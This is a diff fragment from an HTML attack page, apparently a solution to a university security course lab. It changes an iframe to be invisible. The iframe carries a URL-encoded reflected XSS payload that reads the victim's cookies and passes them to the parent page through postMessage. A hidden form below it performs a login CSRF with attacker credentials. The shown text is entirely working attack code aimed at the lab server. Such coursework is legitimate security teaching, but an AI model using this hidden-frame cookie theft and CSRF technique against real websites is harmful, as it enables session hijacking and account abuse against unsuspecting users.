@@ -36,7 +36,7 @@ window.addEventListener("message",function (e) {
 
 <body>
 <!--   style="display:none"
- --><iframe id = "overallFrame" name = "csrfFrame" src="http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3E%24(document).ready(function()%20%7B%20console.log(window.document.cookie)%3B%20window.parent.postMessage(window.document.cookie%2C%20'*')%3B%20%7D)%3C%2Fscript%3E"></iframe> 
+ --><iframe style="display:none" id = "overallFrame" name = "csrfFrame" src="http://cis551.cis.upenn.edu/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3E%24(document).ready(function()%20%7B%20console.log(window.document.cookie)%3B%20window.parent.postMessage(window.document.cookie%2C%20'*')%3B%20%7D)%3C%2Fscript%3E"></iframe> 
 <form id="csrfForm" method="POST" target="csrfFrame" action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=1&xssdefense=0">
     <input type="hidden" name="username" value="attacker" />
     <input type="hidden" name="password" value="123456" /> 
